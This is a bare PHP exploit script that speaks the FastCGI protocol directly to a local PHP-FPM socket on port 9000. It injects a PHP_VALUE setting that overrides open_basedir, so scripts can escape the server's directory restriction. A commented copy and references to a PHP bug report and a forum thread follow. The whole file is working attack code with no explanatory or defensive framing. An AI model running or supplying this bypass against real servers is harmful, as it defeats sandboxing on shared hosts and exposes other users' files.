<?php
$params = array();$params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME'];$params['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME'];$params['REQUEST_METHOD'] = 'GET';$params['QUERY_STRING'] = 'stop=true';$params['PHP_VALUE'] = 'open_basedir=/';$params_encoded = '';foreach ($params as $k=>$v) {$params_encoded.= chr(strlen($k)).chr(strlen($v)).$k.$v;}$len = strlen($params_encoded);$len_encoded = chr($len >> 8).chr($len & 255);$fp = fsockopen('127.0.0.1',9000);fwrite($fp, "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00");fwrite($fp, "\x01\x04\x00\x01".$len_encoded."\x00\x00".$params_encoded);fwrite($fp, "\x01\x04\x00\x01\x00\x00\x00\x00");fwrite($fp, "\x01\x05\x00\x01\x00\x00\x00\x00");sleep(2);$result = '';while (!feof($fp)) {$result .= fread($fp, 1024);}fclose($fp);$matches = array();preg_match('/START.*END/s', $result, $matches);echo $matches[0];


// $params = array();$params['SCRIPT_NAME'] = $_SERVER['SCRIPT_NAME'];$params['SCRIPT_FILENAME'] = $_SERVER['SCRIPT_FILENAME'];$params['REQUEST_METHOD'] = 'GET';$params['QUERY_STRING'] = 'stop=true';$params['PHP_VALUE'] = 'open_basedir=/';$params_encoded = '';foreach ($params as $k=>$v) {$params_encoded.= chr(strlen($k)).chr(strlen($v)).$k.$v;}$len = strlen($params_encoded);$len_encoded = chr($len >> 8).chr($len & 255);$fp = fsockopen('127.0.0.1',9000);fwrite($fp, \"\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\");fwrite($fp, \"\x01\x04\x00\x01\".$len_encoded.\"\x00\x00\".$params_encoded);fwrite($fp, \"\x01\x04\x00\x01\x00\x00\x00\x00\");fwrite($fp, \"\x01\x05\x00\x01\x00\x00\x00\x00\");sleep(2);$result = '';while (!feof($fp)) {$result .= fread($fp, 1024);}fclose($fp);$matches = array();preg_match('/START.*END/s', $result, $matches);echo $matches[0];

// https://bugs.php.net/bug.php?id=70134
// https://www.rdot.org/forum/showthread.php?t=1515&page=2